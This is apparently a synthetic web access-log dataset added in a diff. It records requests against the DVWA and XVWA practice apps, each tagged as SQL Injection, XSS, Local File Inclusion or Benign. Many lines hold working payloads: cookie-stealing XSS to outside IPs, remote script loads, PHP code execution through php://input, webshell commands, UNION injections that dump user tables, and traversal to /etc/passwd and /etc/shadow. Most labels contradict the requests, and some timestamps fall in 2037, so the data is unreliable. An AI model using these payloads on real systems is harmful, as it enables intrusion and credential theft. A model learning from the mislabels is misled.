@@ -1,0 +1,206 @@
+171.77.125.184 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 209 ,SQL Injection
+218.238.98.230 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Ca+href%3D%22javascript%3Aalert%281%29%22%3EXSS%3C%2Fa%3E HTTP/1.1  [-] 200 1474 ,Local File Inclusion
+154.111.234.41 , [13/Mar/2022:00:50:08 +0800] ,GET /?file=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F123.64.179.106%2F575002.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 5707  ,XSS
+32.85.100.143 , [13/Mar/2022:00:51:52 +0800] ,GET ../../../../apache/logs/access.log HTTP/1.1  200 3096 ,SQL Injection
+238.200.212.12 , [13/Mar/2022:01:24:55 +0800] ,GET /vulnerabilities/exec/ HTTP/1.1  [-] 200 1444 ,Local File Inclusion
+168.88.57.111 , [22/May/2012:00:16:54 +0000] ,GET ../../../../apache/logs/error.log HTTP/1.1  200 2382 ,SQL Injection
+250.226.120.204 , [07/Mar/2023:10:43:10 -0500] ,GET /dvwa/css/main.css HTTP/1.1  [-] 304 0 ,XSS
+50.57.218.188 , [22/May/2012:00:16:54 +0000] ,GET ../../../../etc/shadow HTTP/1.1  200 3982 ,Benign
+31.151.99.171 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%20AND%20%28SELECT%204523%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a7a6a71%2C%28SELECT%20%28ELT%284523%3D4523%2C1%29%29%29%2C0x71706a6b71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA%2eCHARACTER_SETS%20GROUP%20BY%20x%29a%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
+101.35.217.22 , [27/Dec/2037:12:00:00 +0530] ,GET /index.php HTTP/1.1  [-] 200 2713 ,Local File Inclusion
+146.125.195.18 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/dvwa/images/lock.png HTTP/1.1  [-] 304 0 ,XSS
+152.168.246.43 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1  [-] 304 0 ,SQL Injection
+107.205.74.239 , [13/Mar/2022:00:29:53 +0800] ,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 1829 ,XSS
+241.77.40.168 , [21/Feb/2022:14:45:25 +0800] ,GET ..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 2834 ,XSS
+12.142.240.41 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/ HTTP/1.1  [-] 302 5 ,Local File Inclusion
+253.186.172.55 , [21/Feb/2022:13:32:01 +0800] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 200 4026 ,XSS
+165.167.152.251 , [13/Mar/2022:00:35:57 +0800] ,GET /dvwa/vulnerabilities/fi/?page=../../../../../../../../etc/passwd HTTP/1.1  [-] 200 1628 ,Local File Inclusion
+143.70.162.20 , [21/Feb/2022:13:51:21 +0800] ,POST /login.php HTTP/1.1  [username=admin&password=password&Login=Login&user_token=b05b5f987d93f9447f5525a9c2c528f6] 302 5 ,SQL Injection
+245.202.131.158 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/fi/?page=php://filter/resource=/etc/passwd HTTP/1.1  [-] 200 1630 ,SQL Injection
+153.39.91.73 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/js/dvwaPage.js HTTP/1.1  [-] 304 0 ,SQL Injection
+153.34.205.218 , [13/Mar/2022:00:29:38 +0800] ,GET / HTTP/1.1  [-] 403 152 ,Local File Inclusion
+249.155.104.169 , [13/Mar/2022:00:04:49 +0800] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
+191.201.104.33 , [21/Feb/2022:14:13:35 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2873%29%2BCHAR%2878%29%2BCHAR%2874%29%2BCHAR%2869%29%2BCHAR%2867%29%2BCHAR%2884%29%2BCHAR%2888%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%2880%29%2BCHAR%2875%29%2BCHAR%28116%29%2BCHAR%2869%29%2BCHAR%2865%29%2BCHAR%28113%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28107%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
+73.31.109.254 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 304 0 ,XSS
+134.174.96.116 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
+218.58.56.182 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
+58.26.221.227 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [-] 200 53 ,SQL Injection
+78.18.254.101 , [16/Mar/2023:03:21:55 -0400] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53 ,SQL Injection
+41.77.76.169 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1  [-] 200 1030 ,XSS
+104.15.10.17 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa HTTP/1.1  [-] 301 194 ,SQL Injection
+215.74.72.90 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/images/login_logo.png HTTP/1.1  [-] 200 9088 ,XSS
+68.245.188.88 , [13/Mar/2022:00:03:59 +0800] ,GET /dvwa/index.php HTTP/1.1  [-] 200 2716 ,SQL Injection
+228.30.251.68 , [07/Mar/2022:16:41:41 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>\x0D\x0A] 200 53 ,SQL Injection
+84.18.14.204 , [07/Mar/2023:10:41:01 -0500] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 53 ,SQL Injection
+47.156.43.117 , [21/Feb/2022:14:11:50 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%20AND%205650%3DCONVERT%28INT%2C%28UNION%20ALL%20SELECTCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%2BCHAR%2888%29%29%29&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1675  ,XSS
+53.43.172.23 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=ls HTTP/1.1  [<?php echo shell_exec($_GET['cmd']);?>] 200 53 ,SQL Injection
+17.189.65.124 , [09/Mar/2022:17:02:46 +0800] ,GET /dvwa/login.php HTTP/1.1  [-] 200 684 ,Local File Inclusion
+237.95.95.38 , [25/Jun/2020:03:09:12 +0000] ,GET //dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
+216.249.146.142 , [13/Mar/2022:01:24:55 +0800] ,GET /dvwa/images/logo.png HTTP/1.1  [-] 304 0 ,Benign
+173.178.112.85 , [16/Mar/2023:03:20:21 -0400] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 304 0 ,XSS
+4.252.170.155 , [25/Jun/2020:03:09:12 +0000] ,POST /dvwa/login.php HTTP/1.1  [username=admin&password=password&Login=Login&user_token=82cd68d7a0ff7418275ac0d9af67f899] 302 5 ,Local File Inclusion
+155.11.227.145 , [13/Mar/2022:01:24:55 +0800] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>\x0D\x0A] 200 1630 ,SQL Injection
+3.11.11.255 ,  [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/fi/?page=php://input&cmd=Y2F0IC9ldGMvcGFzc3dk HTTP/1.1  [<?php echo passthru(base64_decode($_GET['cmd']));?>] 200 1630 ,SQL Injection
+105.89.227.45 , [21/Feb/2022:14:11:57 +0800] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,Local File Inclusion
+59.170.153.54 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 200 4026 ,XSS
+206.120.135.81 , [21/Feb/2022:14:07:51 +0800] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 200 842 ,XSS
+9.159.154.220 , [09/Mar/2023:23:42:01 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=%20ORDER%20BY%201%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1675  ,XSS
+29.144.14.29 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2C%60user%60%2Cavatar%2Cfailed_login%2Cfirst_name%2Clast_login%2Clast_name%2Cpassword%2Cuser_id%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.users--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
+55.200.44.107 , [22/May/2012:00:16:54 +0000] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,Local File Inclusion
+199.36.204.101 , [13/Mar/2022:00:04:04 +0800] ,GET get.php?file=../../../../apache/logs/access.log HTTP/1.1  200 2577 ,Local File Inclusion
+233.119.202.230 , [25/Jun/2020:03:09:12 +0000] ,GET get.php?file=../../../../apache/logs/error.log HTTP/1.1  200 3774 ,SQL Injection
+237.242.192.56 , [09/Mar/2022:17:02:46 +0800] ,GET get.php?file=../../../../etc/passwd HTTP/1.1  200 6062 ,SQL Injection
+14.208.109.77 , [10/Mar/2023:04:06:56 -0500] ,GET get-files?file=../../../../apache/logs/access.log HTTP/1.1  200 7538 ,SQL Injection
+223.189.173.103 , [27/Dec/2037:12:00:00 +0530] ,GET get-files?file=../../../../etc/passwd HTTP/1.1  200 1264 ,SQL Injection
+1.164.74.176 , [12/Mar/2023:08:27:41 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x6775657374626f6f6b%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
+173.27.114.111 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccolumn_name%2Ccolumn_type%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20table_name%3D0x7573657273%20AND%20table_schema%3D0x64767761--%20-&Submit=Submit HTTP/1.1  200 130 ,XSS
+167.20.30.216 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 1175  ,SQL Injection
+187.226.64.32 , [21/Feb/2022:13:30:52 +0800] ,GET /?file=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 2244  ,SQL Injection
+14.65.67.247 , [21/Feb/2022:14:10:35 +0800] ,GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F119.28.107.63%2F430999%27%293C%2Fscript%3E HTTP/1.1   200 4720  ,SQL Injection
+204.169.26.211 , [21/Feb/2022:13:33:16 +0800] ,GET /?file=%3Cscript%3E%window.open%28%27http%3A%2F%2F132.144.70.196%2F536457%27%293C%2Fscript%3E HTTP/1.1   200 2570  ,SQL Injection
+56.3.129.32 ,  [16/Mar/2023:03:21:50 -0400] ,GET /?file=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F104.232.239.10%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 7536  ,Local File Inclusion
+122.226.135.9 , [21/Feb/2022:14:07:38 +0800] ,GET main.cgi?file=../../../../apache/logs/access.log HTTP/1.1  200 2634 ,SQL Injection
+189.81.28.157 , [21/Feb/2022:14:13:49 +0800] ,GET main.cgi?file=../../../../apache/logs/error.log HTTP/1.1  200 4714 ,SQL Injection
+124.59.136.249 , [13/Mar/2022:00:04:04 +0800] ,GET main.cgi?file=../../../../etc/shadow HTTP/1.1  200 2086 ,XSS
+239.69.30.191 , [25/Jun/2020:03:09:12 +0000] ,GET main.cgi?file=..\..\..\..\..\..\winnt\win.ini HTTP/1.1  200 6032 ,XSS
+31.200.232.228 , [13/Mar/2022:00:29:16 +0800] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=ls&cwd=null] 200 146 ,XSS
+226.140.42.28 , [27/Aug/2011:03:09:46 +0000] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=ls&cwd=null] 200 146 ,XSS
+201.202.219.54 , [22/May/2012:00:16:54 +0000] ,POST /dvwa/hackable/uploads/definitelyimage.php?feature=shell HTTP/1.1  [cmd=whoami&cwd=null] 200 84 ,XSS
+69.249.109.216 , [09/Mar/2022:17:00:53 +0800] ,POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1  [cmd=ls&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 124 ,SQL Injection
+245.103.115.160 , [25/Jun/2020:03:09:12 +0000] ,POST /dvwa/hackable/uploads/shell.php?feature=shell HTTP/1.1  [cmd=whoami&cwd=%2Fvar%2Fwww%2Fhtml%2Fdvwa%2Fhackable%2Fuploads] 200 84 ,SQL Injection
+170.103.93.212 , [27/Dec/2037:12:00:00 +0530] ,GET / HTTP/1.1  [-] 403 208 ,Benign
+10.173.55.187 , [16/Mar/2023:04:12:30 -0400] ,GET /favicon.ico HTTP/1.1  [-] 404 209 ,Local File Inclusion
+41.219.206.222 , [13/Mar/2022:00:04:04 +0800] ,GET /xvwa/ HTTP/1.1  [-] 200 3382 ,SQL Injection
+234.131.78.237 , [13/Mar/2022:00:04:41 +0800] ,GET /xvwa/img/xvwa-logo.png HTTP/1.1  [-] 304 0 ,SQL Injection
+13.119.17.86 , [12/Mar/2023:08:27:00 -0400] ,GET /xvwa/vulnerabilities/ssti/ HTTP/1.1  [-] 200 3112 ,SQL Injection
+164.143.53.213 , [13/Mar/2022:00:04:01 +0800] ,GET /dvwa/security.php HTTP/1.1  [-] 200 2219 ,Local File Inclusion
+35.111.96.96 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 209 ,SQL Injection
+233.170.130.146 , [07/Mar/2022:16:41:41 +0800] ,GET /dvwa/vulnerabilities/brute/ HTTP/1.1  [-] 200 1475 ,XSS
+203.53.3.219 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 200 593 ,XSS
+22.249.195.78 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa/vulnerabilities/exec/ HTTP/1.1  [-] 200 1444 ,Benign
+92.236.100.145 , [10/Mar/2023:04:27:28 -0500] ,GET /dvwa/vulnerabilities/exec/ HTTP/1.1  [-] 200 1444 ,Benign
+0.182.184.136 , [13/Mar/2022:00:04:04 +0800] ,GET / HTTP/1.1  [-] 403 152 ,Local File Inclusion
+99.205.41.64 , [25/Jun/2020:03:09:12 +0000] ,GET /favicon.ico HTTP/1.1  [-] 404 152 ,Local File Inclusion
+249.134.37.199 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa HTTP/1.1  [-] 301 194 ,SQL Injection
+242.171.182.45 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/ HTTP/1.1  [-] 302 5 ,Local File Inclusion
+159.147.172.124 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/login.php HTTP/1.1  [-] 200 684 ,Local File Inclusion
+213.5.94.204 , [21/Feb/2022:14:43:44 +0800] ,GET /dvwa/dvwa/css/login.css HTTP/1.1  [-] 200 842 ,XSS
+84.152.207.188 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/images/login_logo.png HTTP/1.1  [-] 200 9088 ,XSS
+175.116.98.84 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/setup.php HTTP/1.1  [-] 200 2085 ,Benign
+168.59.44.160 , [21/Feb/2022:14:11:25 +0800] ,GET /dvwa/dvwa/images/spanner.png HTTP/1.1  [-] 200 464 ,Benign
+192.49.147.104 , [16/Mar/2023:03:41:51 -0400] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 152 ,SQL Injection
+117.25.225.118 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/security.php HTTP/1.1  [-] 200 2202 ,XSS
+76.154.60.131 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/dvwa/images/lock.png HTTP/1.1  [-] 200 761 ,XSS
+99.98.64.49 ,  [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/js/add_event_listeners.js HTTP/1.1  [-] 404 152 ,SQL Injection
+209.140.166.233 , [10/Mar/2023:05:32:31 -0500] ,GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F145.190.136.169%22%3C%2Fscript%3E HTTP/1.1   200 1297  ,Benign
+92.232.133.140 , [22/May/2012:00:16:54 +0000] ,GET /?file=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F183.250.61.150%22%3C%2Fscript%3E HTTP/1.1   200 3886  ,Local File Inclusion
+249.100.45.81 , [13/Mar/2022:00:04:41 +0800] ,GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F124.25.127.129%2F898879.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 4972  ,Benign
+98.247.249.191 , [09/Mar/2022:17:00:52 +0800] ,GET /?name=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F141.19.75.249%2F869455.js%3D%3E%3C%2Fscript%3E HTTP/1.1  200 4879 ,XSS
+178.7.109.61 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 3288  ,Local File Inclusion
+139.206.69.187 , [07/Mar/2023:10:44:02 -0500] ,GET /?name=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 3982  ,Benign
+8.10.218.67 ,  [27/Aug/2011:03:09:46 +0000] ,GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F181.217.202.255%2F488204%27%293C%2Fscript%3E HTTP/1.1   200 1285  ,SQL Injection
+217.127.218.175 , [22/May/2012:00:16:54 +0000] ,GET /?name=%3Cscript%3E%window.open%28%27http%3A%2F%2F4.8.29.8%2F894133%27%293C%2Fscript%3E HTTP/1.1   200 7337  ,Benign
+5.93.68.132 ,  [09/Mar/2022:17:00:51 +0800] ,GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F136.108.230.32%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 2624  ,Local File Inclusion
+139.196.109.201 , [09/Mar/2022:17:02:45 +0800] ,GET /?name=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F156.136.208.75%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 5807  ,Local File Inclusion
+160.188.52.89 , [25/Jun/2020:03:09:12 +0000] ,GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F0.156.130.88%22%3C%2Fscript%3E HTTP/1.1   200 4228  ,Benign
+16.76.200.108 , [13/Mar/2022:00:51:52 +0800] ,GET /?name=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F110.108.96.122%22%3C%2Fscript%3E HTTP/1.1   200 4935  ,Local File Inclusion
+0.203.137.47 , [27/Aug/2011:03:09:46 +0000] ,GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F111.115.213.48%2F804199.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 7000  ,Benign
+238.164.84.171 , [12/Mar/2023:08:29:11 -0400] ,GET /?p=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F164.235.246.70%2F796213.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 2687  ,Benign
+146.80.198.140 , [22/May/2012:00:16:54 +0000] ,GET /?p=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 4343  ,XSS
+33.27.127.6 ,  [27/Dec/2037:12:00:00 +0530] ,GET /?p=%3Cscript%3E%window.open%28%27http%3A%2F%2F172.68.135.129%2F47198%27%293C%2Fscript%3E HTTP/1.1   200 2330  ,Benign
+96.182.134.66 , [09/Mar/2022:17:00:55 +0800] ,GET /?p=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F153.131.117.236%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 1732  ,Local File Inclusion
+68.152.140.71 , [25/Jun/2020:03:09:12 +0000] ,GET /?p=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F100.183.88.107%22%3C%2Fscript%3E HTTP/1.1   200 2158  ,Benign
+37.78.85.232 , [07/Mar/2022:16:15:53 +0800] ,GET /?search=%3Cscript%3E%3Cscript%2Bsrc%3D%22http%3A%2F%2F107.238.201.227%2F763569.js%3D%3E%3C%2Fscript%3E HTTP/1.1   200 5551  ,XSS
+45.6.61.135 ,  [22/May/2012:00:16:54 +0000] ,GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 1472  ,Local File Inclusion
+29.96.14.70 ,  [13/Mar/2022:00:29:53 +0800] ,GET /?search=%3Cscript%3E%alert%28%22xss%22%293C%2Fscript%3E HTTP/1.1   200 1604  ,SQL Injection
+228.191.239.211 , [07/Mar/2022:16:41:41 +0800] ,GET /?search=%3Cscript%3E%window.open%28%27http%3A%2F%2F143.46.228.198%2F106135%27%293C%2Fscript%3E HTTP/1.1   200 7076  ,Benign
+85.177.123.189 , [13/Mar/2022:00:14:02 +0800] ,GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F114.61.64.247%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 6421  ,Benign
+249.168.209.45 , [13/Mar/2022:00:14:02 +0800] ,GET /?search=%3Cscript%3Ewindow.location%3D'http%3A%2F%2F12.66.35.241%2F%3Fcookie%3D'%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1   200 6644  ,Local File Inclusion
+250.27.242.62 , [10/Mar/2023:04:27:28 -0500] ,GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F12.80.50.136%22%3C%2Fscript%3E HTTP/1.1   200 3879  ,Local File Inclusion
+154.89.118.46 , [13/Mar/2022:00:04:04 +0800] ,GET /?search=%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2F152.4.200.33%22%3C%2Fscript%3E HTTP/1.1   200 6953  ,Benign
+250.199.89.124 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa//dvwa/js/add_event_listeners.js HTTP/1.1  [-] 304 0 ,SQL Injection
+107.158.43.105 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/css/main.css HTTP/1.1  [-] 304 0 ,XSS
+119.101.157.10 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/images/logo.png HTTP/1.1  [-] 304 0 ,XSS
+223.121.219.94 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/js/dvwaPage.js HTTP/1.1  [-] 304 0 ,SQL Injection
+142.232.90.120 , [21/Feb/2022:14:43:44 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1  [-] 200 1593 ,XSS
+94.77.96.139 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/xss_d/?default=%253Cimg%2520src%3Dx%2520onerror%3Dalert%281%29%253Ebob%253C%2Fimg%253E HTTP/1.1  [-] 200 1593 ,XSS
+128.154.59.250 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cbody%20onload=alert(1)%3E HTTP/1.1  [-] 200 1593 ,SQL Injection
+146.125.27.225 , [21/Feb/2022:14:11:25 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1  [-] 200 1593 ,Local File Inclusion
+142.251.15.54 , [16/Mar/2023:03:41:51 -0400] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=%E2%80%99 HTTP/1.1  [-] 200 1593 ,Local File Inclusion
+38.65.215.63 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=1%20onerror=alert(1)%3E HTTP/1.1  [-] 200 1593 ,SQL Injection
+140.43.87.185 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cimg%20src=x%20onerror=alert(1)%3Ebob%3C/img%3E HTTP/1.1  [-] 200 1593 ,SQL Injection
+193.58.28.218 , [09/Mar/2022:17:05:30 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1  [-] 200 1590 ,XSS
+7.63.39.202 ,  [10/Mar/2023:05:32:31 -0500] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1  [-] 302 5 ,SQL Injection
+92.55.132.160 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1  [-] 200 1593 ,XSS
+123.130.245.153 , [13/Mar/2022:00:04:41 +0800] ,GET /dvwa/vulnerabilities/xss_d/?default=%3Cxss%20onmouseover=%22alert(1)%22%3EEngkish%3C/xss%3E HTTP/1.1  [-] 200 1593 ,XSS
+127.57.111.251 , [09/Mar/2022:17:00:52 +0800] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1  [-] 200 1477 ,Benign
+191.197.188.199 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Conclick%3Dalert%281%29%3Eclick+me HTTP/1.1  [-] 200 1480 ,Local File Inclusion
+112.41.203.176 , [07/Mar/2023:10:44:02 -0500] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%282%29%3C%2Fscript%3E HTTP/1.1  [-] 200 1470 ,Benign
+220.113.127.59 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=%3Cxss+onmouseover%3D%22alert%281%29%22%3Etest%3C%2Fxss%3E HTTP/1.1  [-] 200 1488 ,Benign
+231.136.203.200 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/xss_r/?name=script HTTP/1.1  [-] 200 1465 ,XSS
+67.108.135.103 , [09/Mar/2022:17:00:51 +0800] ,POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1  [txtName=a&mtxMessage=onmouseover%3D%22alert%281%29%22&btnSign=Sign+Guestbook] 200 1763 ,SQL Injection
+108.250.78.165 , [09/Mar/2022:17:02:45 +0800] ,POST /dvwa/vulnerabilities/xss_s/ HTTP/1.1  [txtName=test&mtxMessage=%3Conmouseover%3D%22alert%281%29%22%3E&btnSign=Sign+Guestbook] 200 1774 ,Local File Inclusion
+19.181.73.65 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ccomment%2Ccomment_id%2Cname%29%29%2C0x717a786b71%29%2CNULL%20FROM%20dvwa.guestbook--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
+161.87.155.87 , [13/Mar/2022:00:51:52 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20ALL%20SELECT%20CONCAT%280x71706b6a71%2CJSON_ARRAYAGG%28CONCAT_WS%280x627867646761%2Ctable_name%29%29%2C0x717a786b71%29%2CNULL%20FROM%20INFORMATION_SCHEMA.TABLES%20WHERE%20table_schema%20IN%20%280x64767761%29--%20-&Submit=Submit HTTP/1.1  [-] 200 82 ,XSS
